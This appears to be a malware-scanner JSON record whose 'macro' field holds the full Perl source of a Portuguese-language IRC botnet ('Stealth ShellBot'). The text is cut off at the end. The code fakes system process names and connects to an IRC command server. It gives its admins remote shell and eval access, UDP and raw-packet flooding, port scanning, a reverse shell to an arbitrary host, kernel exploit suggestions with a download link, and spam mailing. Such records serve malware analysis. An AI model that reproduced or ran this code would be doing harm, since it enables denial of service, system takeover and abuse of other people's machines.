{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "#!/usr/bin/perl\n#\n\n########## CONFIGURACAO ############\n\nmy @ps = (\"/usr/local/apache/bin/httpd -DSSL\",\"/sbin/syslogd\",\"[eth0]\",\"/sbin/klogd -c 1 -x -x\",\"/usr/sbin/acpid\",\"/usr/sbin/cron\",\"[bash]\");\nmy $processo = $ps[rand scalar @ps];\n\n$servidor='irc.byroe.net' unless $servidor;\nmy $porta='6667';\nmy @canais=(\"#tEAmHaCk\");\nmy @adms=(\"CaMaChO\");\n\n# Anti Flood ( 6/3 Recomendado )\nmy $linas_max=10;\nmy $sleep=5;\n\nmy $nick = getnick();\nmy $ircname = getident2();\nmy $realname = \"\u00034[\u0002[\u0002\u00036TeamHacK \u00038LaBoRaToRiuMz\u000312\u0002]\u0002]\u0003\";\n#chop (my $realname = `\u00034[\u0002[\u0002\u00036TeamHacK \u00038LaBoRaToRiuMz\u000312\u0002]\u0002]\u0003`);\n\nmy $acessoshell = 1;\n######## Stealth ShellBot ##########\nmy $prefixo = \"!all\";\nmy $estatisticas = 0;\nmy $pacotes = 1;\n####################################\n\nmy $VERSAO = '0.3b';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\";\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\nmy %irc_servers;\nmy %DCC;\nmy $dcc_sel = new IO::Select->new();\n\n#####################\n# Stealth Shellbot  #\n#####################\n\nsub getnick {\n  return \"KeRabot\".int(rand(03));\n}\n\nsub getident2 {\n        my $length=shift;\n        $length = 3 if ($length < 3);\n\n        my @chars=('a'..'z','A'..'Z','1'..'9');\n        foreach (1..$length)\n        {\n                $randomstring.=$chars[rand @chars];\n        }\n        return $randomstring;\n}\n\n#############################\n#  B0tchZ na veia ehehe :P  #\n#############################\n\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     print \"\\nShellBot $VERSAO by: tEAmHaCk\\n\";\n     print \"nick: $nick\\n\";\n     print \"servidor: $servidor\\n\\n\";\n     sleep 2;\n   }\n\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   &DCC::connections;\n   my @ready = $sel_cliente->can_read(0.6);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\n\nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION mIRC v6.16 Khaled Mardam-Bey\\001\");\n       }\n       elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) {\n         notice(\"$pn\", \"\\001PONG\\001\");\n       }\n       elsif (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n         }\n         elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"$prefixo\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         }\n       }\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4;\n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       $meunick = getnick();\n       nick(\"$meunick\");\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal\");\n       }\n   }\n}\n\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"59\",\"79\",\"80\",\"110\",\"113\",\"135\",\"139\",\"443\",\"445\",\"1025\",\"5000\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"8080\",\"8018\");\n             my (@aberta, %porta_banner);\n             foreach my $porta (@portas)  {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @aberta\");\n             } else {\n                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n           }\n\n           #elsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) {\n           # getstore(\"$1\", \"$2\");\n           # sendraw($IRC_cur_socket, \"PRIVMSG $printl :Download de $2 ($1) Conclu\ufffddo!\");\n           # }\n\n           elsif ($funcarg =~ /^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             my $hostname=\"$1\";\n             my $portainicial = \"$2\";\n             my $portafinal = \"$3\";\n             my (@abertas, %porta_banner);\n             foreach my $porta ($portainicial..$portafinal)\n             {\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n               if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 sendraw($IRC_cur_socket, \"PRIVMSG $printl :Porta $porta aberta em $hostname\");\n               }\n             }\n             if (@abertas) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @abertas\");\n             } else {\n               sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n            }\n\n            # Duas Vers\ufffdes simplificada do meu Tr0x ;D\n            elsif ($funcarg =~ /^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $alvo=inet_aton(\"$1\");\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n\t      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002pacotando\\002: $1 \\002tempo\\002: $tempo\");\n              my $pacote;\n              my $pacotese;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              while (($pacota == \"1\")) {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                $pacote=$rand x $rand x $rand;\n                $porta = int(rand 65000) +1 if ($porta == \"0\");\n                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;\n              }\n               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002pacotado\\002: $1 \\002tempo\\002: $tempo\".\"segs \\002pacotes\\002: $pacotese\");\n            }\n\n            elsif ($funcarg =~ /^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002aviso\\002: \\@udpfaixa foi removido do bot\");\n\t      exit;\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $faixaip=\"$1\";\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Pacotando\\002: $1 \\002tempo\\002: $tempo\");\n              my $pacote;\n              my $pacotes;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              my $alvo;\n              while ($pacota == \"1\") {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                for (my $faixa = 1; $faixa <= 255; $faixa++) {\n                  $alvo = inet_aton(\"$faixaip.$faixa\");\n                  $pacote=$rand x $rand x $rand;\n                  $porta = int(rand 65000) +1 if ($porta == \"0\");\n                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;\n                  if ($faixa >= 255) {\n                    $faixa = 1;\n                  }\n                }\n              }\n               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002faixa\\002: $1\".\"1-\".\"$2\".\"255 \\002tempo\\002: $tempo\".\"segs \\002pacotes\\002: $pacotese\");\n            }\n\n            # Conback.pl by Dominus Vis adaptada e adicionado suporte pra windows ;p\n            elsif ($funcarg =~ /^conback\\s+(.*)\\s+(\\d+)/) {\n              my $host = \"$1\";\n              my $porta = \"$2\";\n              sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta\");\n              my $proto = getprotobyname('tcp');\n              my $iaddr = inet_aton($host);\n              my $paddr = sockaddr_in($porta, $iaddr);\n              my $shell = \"/bin/sh -i\";\n              if ($^O eq \"MSWin32\") {\n                $shell = \"cmd.exe\";\n              }\n              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\n              connect(SOCKET, $paddr) or die \"connect: $!\";\n              open(STDIN, \">&SOCKET\");\n              open(STDOUT, \">&SOCKET\");\n              open(STDERR, \">&SOCKET\");\n              system(\"$shell\");\n              close(STDIN);\n              close(STDOUT);\n              close(STDERR);\n            }\n\n           elsif ($funcarg =~ /^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n            return unless $pacotes;\n             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002M\ufffddia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");\n           }\n           elsif ($funcarg =~ /^xpl\\s+(.*)/) {\n           my $kernel = \"$1\";\n           if ($kernel =~ /2.4.17/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, uselib24\"); goto downloads; }\n           if ($kernel =~ /2.4.18/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, brk, brk2\"); goto downloads; }\n           if ($kernel =~ /2.4.19/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: kmod, newlocal, w00t, brkm brk2\"); goto downloads; }\n           if ($kernel =~ /2.4.20/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: kmod, kmod2, newlocal, w00t, ptrace, ptrace-kmod, brk, brk2\"); goto downloads; }\n           if ($kernel =~ /2.4.21/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl\"); goto downloads; }\n           if ($kernel =~ /2.4.22/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl, mremap_pte, loginx\"); goto downloads; }\n           if ($kernel =~ /2.4.23/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte\"); goto downloads; }\n           if ($kernel =~ /2.4.24/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte\"); goto downloads; }\n           if ($kernel =~ /2.4.25/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }\n           if ($kernel =~ /2.4.26/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }\n           if ($kernel =~ /2.4.27/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }\n           if ($kernel =~ /2.4.28/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }\n           if ($kernel =~ /2.6.0/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: wuftpd, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.2/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: mremap_pte, krad, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.5/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.6/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.7/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.8/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.9/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit, r00t\"); goto downloads; }\n           if ($kernel =~ /2.6.10/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.11/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: h00lyshit, k-rad3\"); goto downloads; }\n           if ($kernel =~ /2.6.12/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: h00lyshit\"); goto downloads; }\n           if ($kernel =~ /2.6.13/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }\n           if ($kernel =~ /2.6.14/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }\n           if ($kernel =~ /2.6.15/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }\n           if ($kernel =~ /2.6.16/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }\n           if ($kernel =~ /2.6.17/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: nothing =)\");\n           exit;\n           downloads:\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : downloads: \u000312\u001fhttp://orangutan.or.id/xpl/\");\n           }\n           elsif ($funcarg =~ /^info/) {\n           my $sysos = `uname -sr`;\n           my $uptime = `uptime`;\n           if ( $sysos =~ /freebsd/i ) {\n           $sysname = `hostname`;\n           $memory = `expr \\`cat /var/run/dmesg.boot | grep \"real memory\" | cut -f5 -d\" \"\\` \\/ 1048576`;\n           $swap = `$toploc | grep -i swap | cut -f2 -d\" \" | cut -f1 -d\"M\"`;\n           chomp($memory);\n           chomp($swap);\n           }\n           elsif ( $sysos =~ /linux/i ) {\n           $sysname = `hostname -f`;\n           $memory = `free -m |grep -i mem | awk '{print \\$2}'`;\n           $swap = `free -m |grep -i swap | awk '{print \\$2}'`;\n           chomp($swap);\n           chomp($memory);\n           }\n           else {\n           $sysname =\"Not Found\";;\n           $memory =\"Not found\";\n           $swap =\"Not Found\";\n           }\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000315--- \u00033[\u000301 SysInfo \u00033] \u000315-------------\");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301os/host\u000315\u0002;\u0002\u000301 $sysos - $sysname \");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301proc/PID\u000315\u0002;\u0002\u000301 $processo - $$\");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301uptime\u000315\u0002;\u0002\u000301 $uptime\");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301memory/swap\u000315\u0002;\u0002\u000301 $memory - $swap\");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301perl/bot\u000315\u0002;\u0002\u000301 $] - $VERSAO\");\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000315--- \u00033[\u000301 /SysInfo \u00033] \u000315------------\");\n           }\n           elsif($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl : \u000301Enviando e-mail para: $3\");\n           $subject = $1;\n           $sender = $2;\n           $recipient = $3;\n           @corpo = $4;\n           $mailtype = \"content-type: text/html\";\n           $sendmail = '/usr/sbin/sendmail';\n           open (SENDMAIL, \"| $sendmail -t\");\n           print SENDMAIL \"$mailtype\\n\";\n           print SENDMAIL \"Subject: $subject\\n\";\n           print SENDMAIL \"From: $sender\\n\";\n           print SENDMAIL \"To: $recipient\\n\\n\";\n           print SENDMAIL \"@corpo\\n\\n\";\n           close (SENDMAIL);\n           sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000301email enviado para: $recipient\");\n           }\n           exit;\n    }\n  }\n}\n\nsub ircase {\n  my ($kem, $printl, $case) = @_;\n\n   if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   elsif ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   elsif ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   elsif ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^voice/) {\n      voice(\"$printl\", \"$kem\") if $case eq \"voice\";\n      $oarg = substr($case, 6);\n      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^devoice/) {\n      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";\n      $oarg = substr($case, 8);\n      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^invite\\s+(\\S+) (.*)/) {\n      invite(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   elsif ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   elsif ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {\n      DCC::SEND(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   elsif ($case =~ /^eval (.*)/) {\n      eval \"$1\";\n   }\n   elsif ($case =~ /^entra\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    j(\"$1\");\n   }\n   elsif ($case =~ /^sai\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    p(\"$1\");\n   }\n   elsif ($case =~ /^sair/) {\n     quit();\n   }\n   elsif ($case =~ /^novonick/) {\n    my $novonick = getnick();\n     nick(\"$novonick\");\n   }\n   elsif ($case =~ /^estatisticas (.*)/) {\n     if ($1 eq \"on\") {\n      $estatisticas = 1;\n      msg(\"$printl\", \"Estat\ufffdsticas ativadas!\");\n     } elsif ($1 eq \"off\") {\n      $estatisticas = 0;\n      msg(\"$printl\", \"Estat\ufffdsticas desativadas!\");\n     }\n   }\n   elsif ($case =~ /^pacotes (.*)/) {\n     if ($1 eq \"on\") {\n      $pacotes = 1;\n      msg(\"$printl\", \"Pacotes ativados!\") if ($estatisticas == \"1\");\n     } elsif ($1 eq \"off\") {\n      $pacotes = 0;\n      msg(\"$printl\", \"Pacotes desativados!\") if ($estatisticas == \"1\");\n     }\n   }\n}\nsub shell {\n  return unless $acessoshell;\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"Diret\ufffdrio inexistente!\");\n    return;\n  }\n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c >= \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\n\n#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki\nsub attacker {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'B' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n\n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65535; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);\n\n       # DoS ?? :P\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\n\n#############\n#  ALIASES  #\n#############\n\nsub action {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub hop {\n    return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub dehop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub voice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +v $_[1]\");\n}\nsub devoice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -v $_[1]\");\n}\nsub ban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +b $_[1]\");\n}\nsub unban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -b $_[1]\");\n}\nsub kick {\n   return unless $#_ == 1;\n   sendraw(\"KICK $_[0] $_[1] :$_[2]\");\n}\n\nsub modo {\n   return unless $#_ == 0;\n   sendraw(\"MODE $_[0] $_[1]\");\n}\nsub mode { modo(@_); }\n\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {sendraw(\"PART $_[0]\");}\n\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\n\nsub invite {\n   return unless 